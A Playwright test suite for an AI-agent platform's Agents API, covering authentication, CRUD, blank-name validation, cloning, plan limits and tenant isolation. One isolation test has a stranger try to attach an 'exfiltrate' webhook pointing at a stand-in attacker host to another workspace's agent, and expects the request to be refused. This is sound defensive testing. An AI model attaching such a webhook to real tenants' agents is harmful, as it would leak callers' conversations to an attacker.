/**
 * Agent API contract, against the real FastAPI + Postgres.
 *
 * Each test owns a disposable account, so they parallelise safely and none can
 * see another's rows — which is also what makes the isolation test meaningful.
 */
import { test, expect } from '@playwright/test'
import {
  API_URL,
  auth,
  createSession,
  createTrialSession,
  deleteAgentQuietly,
  type Session,
} from '../support/api'

const NEW_AGENT = {
  name: 'Contract Agent',
  system_prompt: 'You are a test agent.',
  description: 'Created by the QA suite',
}

test.describe('Agents API', () => {
  test('rejects an anonymous caller on every verb', async ({ request }) => {
    const paths = [
      request.get(`${API_URL}/api/v1/agents`),
      request.post(`${API_URL}/api/v1/agents`, { data: NEW_AGENT }),
      request.get(`${API_URL}/api/v1/agents/${crypto.randomUUID()}`),
      request.delete(`${API_URL}/api/v1/agents/${crypto.randomUUID()}`),
    ]

    for (const res of await Promise.all(paths)) {
      expect(res.status()).toBe(401)
    }
  })

  test('creates an agent and returns the flattened row the list page reads', async ({
    request,
  }) => {
    const session = await createTrialSession(request)

    const res = await request.post(`${API_URL}/api/v1/agents`, {
      headers: auth(session),
      data: NEW_AGENT,
    })

    expect(res.status()).toBe(201)
    const body = await res.json()
    // The request nests config (llm/voice/stt) but the response flattens it.
    // That asymmetry is the actual contract, and the UI depends on both halves
    // (dashboard/agents/page.tsx:18).
    expect(body).toMatchObject({
      name: NEW_AGENT.name,
      system_prompt: NEW_AGENT.system_prompt,
      llm_provider: expect.any(String),
      llm_model: expect.any(String),
      tts_provider: expect.any(String),
      stt_provider: expect.any(String),
    })
    expect(body.id).toBeTruthy()
    expect(body.organization_id).toBeTruthy()

    await deleteAgentQuietly(request, session, body.id)
  })

  test('applies provider defaults when the client sends none', async ({ request }) => {
    const session = await createTrialSession(request)

    const res = await request.post(`${API_URL}/api/v1/agents`, {
      headers: auth(session),
      data: { name: 'Defaults Only', system_prompt: 'Hi' },
    })

    expect(res.status()).toBe(201)
    const body = await res.json()
    // An agent with no LLM configured could never answer a call, so the server
    // must fill these rather than storing nulls.
    expect(body.llm_provider).toBeTruthy()
    expect(body.llm_model).toBeTruthy()

    await deleteAgentQuietly(request, session, body.id)
  })

  test('refuses an agent with no name', async ({ request }) => {
    const session = await createTrialSession(request)

    const res = await request.post(`${API_URL}/api/v1/agents`, {
      headers: auth(session),
      data: { system_prompt: 'No name given' },
    })

    expect(res.status()).toBe(422)
  })

  test('refuses an empty name, which validates differently from a missing one', async ({
    request,
  }) => {
    const session = await createTrialSession(request)

    const res = await request.post(`${API_URL}/api/v1/agents`, {
      headers: auth(session),
      data: { name: '', system_prompt: 'Blank name' },
    })

    expect(res.status()).toBe(422)
  })

  test('lists the agents this workspace created', async ({ request }) => {
    const session = await createTrialSession(request)
    const created = await (
      await request.post(`${API_URL}/api/v1/agents`, { headers: auth(session), data: NEW_AGENT })
    ).json()

    const res = await request.get(`${API_URL}/api/v1/agents`, { headers: auth(session) })

    expect(res.status()).toBe(200)
    const body = await res.json()
    // `{agents, total}` is the envelope the dashboard destructures; a bare array
    // would render an empty list with no error.
    expect(Array.isArray(body.agents)).toBe(true)
    expect(body.total).toBeGreaterThanOrEqual(1)
    expect(body.agents.map((a: { id: string }) => a.id)).toContain(created.id)

    await deleteAgentQuietly(request, session, created.id)
  })

  test('updates only the fields sent in a PATCH', async ({ request }) => {
    const session = await createTrialSession(request)
    const created = await (
      await request.post(`${API_URL}/api/v1/agents`, { headers: auth(session), data: NEW_AGENT })
    ).json()

    const res = await request.patch(`${API_URL}/api/v1/agents/${created.id}`, {
      headers: auth(session),
      data: { name: 'Renamed Agent' },
    })

    expect(res.status()).toBe(200)
    const body = await res.json()
    expect(body.name).toBe('Renamed Agent')
    // A PATCH that quietly nulls untouched columns would erase the agent's
    // prompt every time someone renames it.
    expect(body.system_prompt).toBe(NEW_AGENT.system_prompt)

    await deleteAgentQuietly(request, session, created.id)
  })

  test('deletes an agent and stops serving it afterwards', async ({ request }) => {
    const session = await createTrialSession(request)
    const created = await (
      await request.post(`${API_URL}/api/v1/agents`, { headers: auth(session), data: NEW_AGENT })
    ).json()

    const deleted = await request.delete(`${API_URL}/api/v1/agents/${created.id}`, {
      headers: auth(session),
    })
    expect(deleted.status()).toBe(204)

    // A soft delete that still answers GET would leave the agent live on calls.
    const after = await request.get(`${API_URL}/api/v1/agents/${created.id}`, {
      headers: auth(session),
    })
    expect(after.status()).toBe(404)
  })

  test('returns 404, not 500, for an id that does not exist', async ({ request }) => {
    const session = await createTrialSession(request)

    const res = await request.get(`${API_URL}/api/v1/agents/${crypto.randomUUID()}`, {
      headers: auth(session),
    })

    expect(res.status()).toBe(404)
  })

  test('returns a 4xx, not a 500, for an id that is not a UUID', async ({ request }) => {
    const session = await createTrialSession(request)

    const res = await request.get(`${API_URL}/api/v1/agents/not-a-uuid`, {
      headers: auth(session),
    })

    expect(res.status()).toBeGreaterThanOrEqual(400)
    expect(res.status()).toBeLessThan(500)
  })

  test('one workspace cannot read or delete another workspace’s agent', async ({ request }) => {
    const owner = await createTrialSession(request)
    const stranger = await createTrialSession(request)
    const created = await (
      await request.post(`${API_URL}/api/v1/agents`, { headers: auth(owner), data: NEW_AGENT })
    ).json()

    // The single most damaging bug this API could have: cross-tenant leakage.
    const read = await request.get(`${API_URL}/api/v1/agents/${created.id}`, {
      headers: auth(stranger),
    })
    expect(read.status()).toBe(404)

    const destroy = await request.delete(`${API_URL}/api/v1/agents/${created.id}`, {
      headers: auth(stranger),
    })
    expect([403, 404]).toContain(destroy.status())

    // And the owner still has it.
    const stillThere = await request.get(`${API_URL}/api/v1/agents/${created.id}`, {
      headers: auth(owner),
    })
    expect(stillThere.status()).toBe(200)

    await deleteAgentQuietly(request, owner, created.id)
  })

  test('a workspace with no subscription is blocked with 402 and an upgrade path', async ({
    request,
  }) => {
    // No trial started: registration leaves entitlements `expired`.
    const session = await createSession(request)

    const res = await request.post(`${API_URL}/api/v1/agents`, {
      headers: auth(session),
      data: NEW_AGENT,
    })

    expect(res.status()).toBe(402)
    const body = await res.json()
    // The frontend keys off this envelope to open the upgrade dialog rather
    // than showing a dead-end error (frontend/src/lib/api.ts:66).
    expect(body).toMatchObject({
      code: 'entitlement_required',
      upgrade_url: expect.stringContaining('/billing'),
    })
    expect(body.detail).toBeTruthy()
  })

  test('the trial plan cap of one agent is enforced by the server', async ({ request }) => {
    const session = await createTrialSession(request)
    const first = await request.post(`${API_URL}/api/v1/agents`, {
      headers: auth(session),
      data: NEW_AGENT,
    })
    expect(first.status()).toBe(201)

    const second = await request.post(`${API_URL}/api/v1/agents`, {
      headers: auth(session),
      data: { ...NEW_AGENT, name: 'One Too Many' },
    })

    // Enforced server-side, so hiding the button in the UI is not the control.
    expect(second.status()).toBe(402)

    await deleteAgentQuietly(request, session, (await first.json()).id)
  })

  test('agent stats are served for the workspace', async ({ request }) => {
    const session = await createTrialSession(request)

    const res = await request.get(`${API_URL}/api/v1/agents/stats`, { headers: auth(session) })

    expect(res.status()).toBe(200)
    // `/agents/stats` must not be swallowed by the `/agents/{id}` route — if the
    // router ordering regresses, this comes back 404 or 422 instead.
    expect(await res.json()).toHaveProperty('stats')
  })
})

/**
 * Names that are technically non-empty but visually blank.
 *
 * `Field(..., min_length=1)` counts characters, so a single space satisfied it.
 * The forms trim before checking, so this was only reachable by a direct API
 * call or a pasted value — but what it produced was an agent occupying a row in
 * the list with no label, no heading and nothing to distinguish it from the
 * next one. The same declaration was used for workflows, tools, workspaces and
 * integrations, so the fix is a shared type (`app/schemas/_types.py`).
 */
test.describe('Agent API — blank names', () => {
  test('an agent named only with whitespace is refused', async ({ request }) => {
    const session = await createTrialSession(request)

    const res = await request.post(`${API_URL}/api/v1/agents`, {
      headers: auth(session),
      data: { name: '   ', system_prompt: 'Should never be created.' },
    })

    expect(res.status()).toBe(422)
  })

  test('a padded name is accepted and stored trimmed', async ({ request }) => {
    const session = await createTrialSession(request)

    const res = await request.post(`${API_URL}/api/v1/agents`, {
      headers: auth(session),
      data: { name: '  Padded Agent  ', system_prompt: 'Trim me.' },
    })

    expect(res.status()).toBe(201)
    // Trimming on the way in is what makes the blank check work at all, so it
    // is worth pinning rather than treating as a side effect.
    expect((await res.json()).name).toBe('Padded Agent')
  })

  test('an agent cannot be renamed to whitespace either', async ({ request }) => {
    // The update schema declared `name` the same way, so a rename was a second
    // route to the same blank row.
    const session = await createTrialSession(request)
    const created = await request.post(`${API_URL}/api/v1/agents`, {
      headers: auth(session),
      data: { name: 'Has A Name', system_prompt: 'x' },
    })
    const { id } = await created.json()

    const res = await request.patch(`${API_URL}/api/v1/agents/${id}`, {
      headers: auth(session),
      data: { name: '   ' },
    })

    expect(res.status()).toBe(422)
  })

  test('a workflow named only with whitespace is refused', async ({ request }) => {
    const session = await createTrialSession(request)

    const res = await request.post(`${API_URL}/api/v1/workflows`, {
      headers: auth(session),
      data: { name: '   ' },
    })

    expect(res.status()).toBe(422)
  })
})

/**
 * Cloning.
 *
 * Every clone the UI sends used to fail. `include_functions` defaults to true,
 * and that branch read `source.functions` — a lazy relationship — after the
 * session had been committed, which SQLAlchemy's async engine cannot do. The
 * result was a 500 for the only request shape the product actually makes;
 * passing `include_functions: false` explicitly was the one way to succeed.
 */
test.describe('Agent API — cloning', () => {
  /** An agent with one function attached, which is what makes cloning non-trivial. */
  async function agentWithFunction(
    request: import('@playwright/test').APIRequestContext,
    session: Session,
  ) {
    const created = await request.post(`${API_URL}/api/v1/agents`, {
      headers: auth(session),
      data: { name: 'Clone Source', system_prompt: 'Source of truth.' },
    })
    const { id } = await created.json()

    await request.post(`${API_URL}/api/v1/agents/${id}/functions`, {
      headers: auth(session),
      data: {
        name: 'lookup_order',
        description: 'Look an order up by its number.',
        parameters: {},
        webhook_url: 'https://example.com/hook',
      },
    })

    return id as string
  }

  test('cloning with the default options succeeds', async ({ request }) => {
    const session = await createTrialSession(request)
    const sourceId = await agentWithFunction(request, session)

    // Deliberately no include_functions — the default is the whole point.
    const res = await request.post(`${API_URL}/api/v1/agents/${sourceId}/clone`, {
      headers: auth(session),
      data: { name: 'Cloned Agent' },
    })

    expect(res.status(), await res.text()).toBe(200)
    expect((await res.json()).name).toBe('Cloned Agent')
  })

  test('the clone carries the source’s functions', async ({ request }) => {
    // Returning 200 is not enough: the flag asks for the functions, so a clone
    // without them is a silent data-loss bug rather than a crash.
    const session = await createTrialSession(request)
    const sourceId = await agentWithFunction(request, session)

    const clone = await request.post(`${API_URL}/api/v1/agents/${sourceId}/clone`, {
      headers: auth(session),
      data: { name: 'Clone With Functions' },
    })
    const { id: cloneId } = await clone.json()

    const functions = await request.get(`${API_URL}/api/v1/agents/${cloneId}/functions`, {
      headers: auth(session),
    })
    const names = (await functions.json()).map((f: { name: string }) => f.name)
    expect(names).toContain('lookup_order')
  })

  test('a clone asked to skip functions gets none', async ({ request }) => {
    const session = await createTrialSession(request)
    const sourceId = await agentWithFunction(request, session)

    const clone = await request.post(`${API_URL}/api/v1/agents/${sourceId}/clone`, {
      headers: auth(session),
      data: { name: 'Bare Clone', include_functions: false },
    })
    const { id: cloneId } = await clone.json()

    const functions = await request.get(`${API_URL}/api/v1/agents/${cloneId}/functions`, {
      headers: auth(session),
    })
    expect(await functions.json()).toHaveLength(0)
  })

  test('a clone cannot be given a blank name', async ({ request }) => {
    // The clone schema carried no length constraint at all, so it was a way
    // round the non-blank rule that guards every other agent name.
    const session = await createTrialSession(request)
    const sourceId = await agentWithFunction(request, session)

    const res = await request.post(`${API_URL}/api/v1/agents/${sourceId}/clone`, {
      headers: auth(session),
      data: { name: '   ' },
    })

    expect(res.status()).toBe(422)
  })

  test('an agent in another workspace cannot be cloned', async ({ request }) => {
    // Cloning reads every field of the source, so a missing scope check here
    // would copy another tenant's prompts and configuration wholesale.
    const owner = await createTrialSession(request)
    const stranger = await createTrialSession(request)
    const sourceId = await agentWithFunction(request, owner)

    const res = await request.post(`${API_URL}/api/v1/agents/${sourceId}/clone`, {
      headers: auth(stranger),
      data: { name: 'Stolen Agent' },
    })

    expect(res.status()).toBe(404)
  })
})

/**
 * Workspace scoping across every agent sub-resource, not just the agent row.
 */
test.describe('Agent API — workspace isolation', () => {
  test('no agent sub-resource answers to a stranger', async ({ request }) => {
    const owner = await createTrialSession(request)
    const stranger = await createTrialSession(request)

    const created = await request.post(`${API_URL}/api/v1/agents`, {
      headers: auth(owner),
      data: { name: 'Private Agent', system_prompt: 'Confidential.' },
    })
    const { id } = await created.json()

    const attempts: Array<[string, Promise<import('@playwright/test').APIResponse>]> = [
      ['GET agent', request.get(`${API_URL}/api/v1/agents/${id}`, { headers: auth(stranger) })],
      [
        'PATCH agent',
        request.patch(`${API_URL}/api/v1/agents/${id}`, {
          headers: auth(stranger),
          data: { name: 'Renamed By Stranger' },
        }),
      ],
      [
        'DELETE agent',
        request.delete(`${API_URL}/api/v1/agents/${id}`, { headers: auth(stranger) }),
      ],
      [
        'GET functions',
        request.get(`${API_URL}/api/v1/agents/${id}/functions`, { headers: auth(stranger) }),
      ],
      [
        // A webhook attached to someone else's agent would exfiltrate their
        // callers' conversations to an address the attacker controls.
        'POST function',
        request.post(`${API_URL}/api/v1/agents/${id}/functions`, {
          headers: auth(stranger),
          data: {
            name: 'exfiltrate',
            description: 'Should never be attached.',
            parameters: {},
            webhook_url: 'https://attacker.example.com/collect',
          },
        }),
      ],
      [
        'POST test',
        request.post(`${API_URL}/api/v1/agents/${id}/test`, {
          headers: auth(stranger),
          data: { test_message: 'hello' },
        }),
      ],
    ]

    for (const [label, pending] of attempts) {
      const res = await pending
      expect(res.status(), `${label} must not succeed`).toBe(404)
    }

    // And the owner's agent is untouched by any of it.
    const still = await request.get(`${API_URL}/api/v1/agents/${id}`, { headers: auth(owner) })
    expect(still.status()).toBe(200)
    expect((await still.json()).name).toBe('Private Agent')
  })
})
